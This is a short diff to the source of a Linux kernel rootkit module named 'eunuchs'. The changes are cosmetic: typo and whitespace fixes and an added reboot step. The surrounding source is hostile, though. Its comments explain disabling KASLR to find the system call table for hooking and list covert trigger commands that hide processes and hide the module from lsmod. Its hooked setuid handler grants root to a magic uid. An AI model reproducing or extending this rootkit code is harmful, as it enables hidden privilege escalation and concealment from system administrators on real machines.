@@ -12,7 +12,8 @@
  * As root...
  * 1. add `nokaslr` to /etc/default/grub in GRUB_CMDLINE_LINUX_DEFAULT
  * 2. execute `update-grub`
- * 3. `grep sys_call_table /boot/System.map-$(uname -r)` to
+ * 3. reboot
+ * 4. `grep sys_call_table /boot/System.map-$(uname -r)` to
  *    find the address of the system call table and change the value below
  **/
 static unsigned long *sct = 0xc167b180;
@@ -41,7 +42,7 @@ static unsigned long *sct = 0xc167b180;
  * Commands:
  *  ohaiplzshowallhiding            - shows all hidden pids (DEBUG ONLY)
  *  kthxbye                         - hide the LKM from lsmod (NOTE: You can't
- *                                    remove the LKM until after you make it 
+ *                                    remove the LKM until after you make it
  *                                    visible again)
  *  lemmesee                        - show the LKM in lsmod
  *  ohaiplzhideproc [pid_to_hide]   - hides specified process by pid
@@ -63,7 +64,7 @@ static unsigned long *sct = 0xc167b180;
 #include <linux/string.h>       // string manipulation
 #include <linux/dirent.h>       // directory entries
 #include <linux/list.h>         // linked lists
-#include <linux/cred.h>        // credentials, for suid
+#include <linux/cred.h>         // credentials, for suid
 
 #include "eunuchs.h"
 
@@ -251,7 +252,7 @@ static typeof(sys_setuid) *orig_setuid;
 
 /**
  * setuid() handler.
- * If the provided taret uid is our supermagical uid, set uid to 0.
+ * If the provided target uid is our superdupermagical uid, set uid to 0.
  **/
 static asmlinkage long eunuchs_setuid(uid_t uid)
 {
